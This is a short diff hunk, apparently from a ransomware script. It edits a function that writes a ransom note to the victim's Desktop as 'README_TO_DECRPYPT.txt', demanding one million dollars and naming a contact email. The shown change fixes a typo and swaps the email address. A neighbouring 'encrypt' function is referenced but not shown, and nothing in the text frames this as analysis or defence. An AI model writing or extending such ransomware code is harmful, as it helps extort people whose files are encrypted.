@@ -35,8 +35,8 @@ def encrypt(file):
 
 def note(userdir):
     note = """ 
-    lmao yout got owned,
-    I need 1 million dollars to ransomguy@sh4man.dev
+    lmao you got owned,
+    I need 1 million dollars to ransomguy@gottem.com
     """
     notepath = os.path.join(userdir, "Desktop", "README_TO_DECRPYPT.txt")
     with open(notepath, 'w') as f:
